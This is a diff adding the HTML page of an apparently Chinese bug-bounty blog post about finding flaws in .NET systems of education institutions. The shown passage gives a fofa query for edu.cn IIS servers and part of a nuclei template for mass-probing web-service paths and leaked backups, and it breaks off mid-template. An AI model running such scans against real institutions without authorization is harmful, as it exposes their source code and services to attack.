@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01 起因小露快把漏洞Top10学差不多了，虽然我猜测她也是仅学了原理，如果运用在现实里大概率是坐牢（形容词：指手足无措，只能干耗时间），为帮助她能有个好的实战经验，我掏出好几年没看过的EDUSRC，想到我入门的时候RG大哥随便甩给我5，6个学校的任意文件下载，就留下一句：“去交吧”，我就能想到他伟岸的背影。 所以我也为小露添加点“初入门栏”就能快点看到曙光的动力，提前看看edusrc，帮她做">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《DotNET代码审计》但是脚本小子版">
+<meta property="og:url" content="http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/index.html">
+<meta property="og:site_name" content="Z1sec-Blog">
+<meta property="og:description" content="0x01 起因小露快把漏洞Top10学差不多了，虽然我猜测她也是仅学了原理，如果运用在现实里大概率是坐牢（形容词：指手足无措，只能干耗时间），为帮助她能有个好的实战经验，我掏出好几年没看过的EDUSRC，想到我入门的时候RG大哥随便甩给我5，6个学校的任意文件下载，就留下一句：“去交吧”，我就能想到他伟岸的背影。 所以我也为小露添加点“初入门栏”就能快点看到曙光的动力，提前看看edusrc，帮她做">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240806052937.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240806053932.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240806061520.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240806061754.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240808112935.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240808113120.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240808113420.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240806043002.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240808113632.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240809095550.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240809100157.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240809100701.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240809100940.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240815141402.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240815141529.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240815141700.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240223173208.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240815142453.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240815142805.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240815143716.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240815144648.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240815144811.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240815145623.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901191912.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901191852.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901192536.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901193838.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901194105.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901194452.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901194828.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901194840.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901195254.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901195419.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901195625.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901195640.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901195818.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240901200306.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927085257.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927085355.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927090706.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927103450.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927103603.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927103619.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927104030.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927104502.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927104600.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240804025328.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927104755.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240804025442.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240927105033.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241219201009.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241219201306.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241219201709.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241219201958.png">
+<meta property="article:published_time" content="2025-01-22T09:28:57.000Z">
+<meta property="article:modified_time" content="2025-01-23T01:27:57.033Z">
+<meta property="article:author" content="z1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240806052937.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>《DotNET代码审计》但是脚本小子版</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/parttime/index.html">PartTime</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/22/DotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&text=《DotNET代码审计》但是脚本小子版"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&title=《DotNET代码审计》但是脚本小子版"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&is_video=false&description=《DotNET代码审计》但是脚本小子版"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=《DotNET代码审计》但是脚本小子版&body=Check out this article: http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&title=《DotNET代码审计》但是脚本小子版"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&title=《DotNET代码审计》但是脚本小子版"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&title=《DotNET代码审计》但是脚本小子版"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&title=《DotNET代码审计》但是脚本小子版"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&name=《DotNET代码审计》但是脚本小子版&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&t=《DotNET代码审计》但是脚本小子版"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E8%B5%B7%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">0x01 起因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Find-bugs"><span class="toc-number">2.</span> <span class="toc-text">0x02 Find bugs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">2.2.</span> <span class="toc-text">定位攻击面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="toc-number">2.3.</span> <span class="toc-text">备份文件扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%BC%80%E5%A7%8B%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text">0x03 开始审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXX%E5%8C%BB%E8%8D%AF%E5%A4%A7%E5%AD%A6"><span class="toc-number">3.1.</span> <span class="toc-text">XXX医药大学</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%85%A5%E5%8F%A3DLL%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.1.</span> <span class="toc-text">找入口DLL文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91%E5%85%A5%E5%8F%A3"><span class="toc-number">3.1.2.</span> <span class="toc-text">反编译入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Webservice%E6%8E%A5%E5%8F%A3%E5%AF%BC%E8%87%B4Sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.3.</span> <span class="toc-text">Webservice接口导致Sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8namespace%E5%8F%8D%E5%90%91%E6%89%BEasmx"><span class="toc-number">3.1.4.</span> <span class="toc-text">利用namespace反向找asmx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAPDF%E5%AF%BC%E8%87%B4RCE"><span class="toc-number">3.1.5.</span> <span class="toc-text">导出PDF导致RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF-%E5%AD%A6%E9%99%A2"><span class="toc-number">3.2.</span> <span class="toc-text">西***学院</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%85%A5%E5%8F%A3DLL"><span class="toc-number">3.2.1.</span> <span class="toc-text">找入口DLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4Sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.2.</span> <span class="toc-text">未授权访问导致Sql注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2"><span class="toc-number">3.3.</span> <span class="toc-text">**师范学院</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL-%E5%85%A5%E5%8F%A3"><span class="toc-number">3.3.1.</span> <span class="toc-text">DLL 入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86%E5%AF%BC%E8%87%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="toc-number">3.3.2.</span> <span class="toc-text">流量解密导致信息泄漏</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%8C%E4%B8%9A%E6%8A%80%E6%9C%AF%E5%AD%A6%E9%99%A2"><span class="toc-number">3.4.</span> <span class="toc-text">**职业技术学院</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebSiteProject-%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">3.4.1.</span> <span class="toc-text">WebSiteProject 模式的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">3.4.2.</span> <span class="toc-text">测试过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E7%BB%93%E6%9D%9F"><span class="toc-number">4.</span> <span class="toc-text">0x04 结束</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        《DotNET代码审计》但是脚本小子版
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">z1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-22T09:28:57.000Z" class="dt-published" itemprop="datePublished">2025-01-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h1><p>小露快把漏洞Top10学差不多了，虽然我猜测她也是仅学了原理，如果运用在现实里大概率是坐牢（形容词：指手足无措，只能干耗时间），为帮助她能有个好的实战经验，我掏出好几年没看过的EDUSRC，想到我入门的时候RG大哥随便甩给我5，6个学校的任意文件下载，就留下一句：“去交吧”，我就能想到他伟岸的背影。<br><img src="/images/Pasted%20image%2020240806052937.png"></p>
+<p>所以我也为小露添加点“初入门栏”就能快点看到曙光的动力，提前看看edusrc，帮她做点什么。</p>
+<p>（此外还叠加下用github搭建的博客不需要钱（<a target="_blank" rel="noopener" href="https://z1sec.github.io/%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%86%99%E4%BA%9B%E4%BB%80%E4%B9%88%E4%B8%8A%E6%9D%A5%E5%A7%8B%E7%BB%88%E8%A7%89%E5%BE%97%E4%BA%8F%E4%BA%86%E3%80%82%E9%81%82%E5%87%BA%E6%AD%A4%E6%96%87%E3%80%82%EF%BC%89">https://z1sec.github.io/），不写些什么上来始终觉得亏了。遂出此文。）</a></p>
+<h1 id="0x02-Find-bugs"><a href="#0x02-Find-bugs" class="headerlink" title="0x02 Find bugs"></a>0x02 Find bugs</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>挖EDU对我现在来说确实有点没意思了（无歧视edu白帽的意思，仅仅只是因为资产太多了，找到一些漏洞确实简单，工具扫描即可）<br><img src="/images/Pasted%20image%2020240806053932.png"></p>
+<p>想着给小露找点有意思的、并且是通用的系统、并且可以快速刷分的漏洞，最快的方式就是找源码了。那么如何找到源码呢？</p>
+<ul>
+<li>如何获取源码？</li>
+</ul>
+<p>方案1：利用nday找edu系统，攻击后成功后获取源码，审计获取0day，批量提交edu刷分。<br>答：易被追责，没这个胆子。</p>
+<p>方案2：批量扫备份文件，下载后，审计获取0day，批量提交edu刷分。<br>答：可行，无害化，但存在问题：及时审计到漏洞，系统也不一定是通用，不一定能上大分。</p>
+<p><strong>还是选择了方案2，说不定会遇到通用。</strong></p>
+<ul>
+<li>选什么系统？</li>
+</ul>
+<p>方案：目前主流网站架构：java、.net、python、go、php，其中.net和php相对来说要更容易泄漏备份文件（不要问为什么，网站部署结构使然），其中.net相对攻击面也会更广一些</p>
+<p><strong>攻击面更广解释</strong>：脚本特性使然，例如php写鉴权，鉴了就是鉴了，基本很少出现权限绕过，而.net则更容易出现鉴权的问题，通常ashx或asmx接口程序猿压根不设限制。虽然java也有一些鉴权绕过，但出现备份文件泄漏的概率比较低就不过多解释了。<br>此外.net更多会使用mssql，也就是说如果能找到sql注入也就有更大概率可以RCE，都代码审计了，谁会不想要个RCE呢？</p>
+<h2 id="定位攻击面"><a href="#定位攻击面" class="headerlink" title="定位攻击面"></a>定位攻击面</h2><p>fofa来个简单的语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=&quot;edu.cn&quot; &amp;&amp; server=&quot;Microsoft-IIS&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240806061520.png"></p>
+<h2 id="备份文件扫描"><a href="#备份文件扫描" class="headerlink" title="备份文件扫描"></a>备份文件扫描</h2><p>导出2000多条链接试一试水，看看能不能找到备份文件。<br><img src="/images/Pasted%20image%2020240806061754.png"></p>
+<p>此时出现了问题，如何批量扫描找备份文件呢？<br>想了下，写一个nuclei脚本，速度快，yaml脚本编写方便，为了防止空军，我还特地加了一些常见的soap路径：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">soap-dir-scan</span></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span>  </span><br><span class="line">  <span class="attr">name:</span> <span class="string">soap</span> <span class="string">dir</span> <span class="string">scan</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">mucn</span>  </span><br><span class="line">  <span class="attr">severity:</span> <span class="string">high</span>  </span><br><span class="line">  <span class="attr">description:</span> <span class="string">soap</span> <span class="string">dir</span> <span class="string">scan</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/Service.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/DataService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/ADPosService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/ajaxhandler.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/AjaxService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/autocomplete.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/BrowseAuctions.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/getbasketdata.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/getcustomerinfo.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/home/SignupNewsletter.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/HTMLGenerator.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/MapServiceProxyWS.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/momondo.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/myalamycustomer.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/newcars/ScriptService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/orderservice.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/processRequest.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/progress.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/services&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/search.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/services/forms/formapi.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/services/locatorSearch.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/services/WebServices/VATService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/Shoppingws.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/SiteServer/Services/AdministratorService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/sports/Services/AjaxMethods.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/stat.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/stockquote.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/Tracking.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span 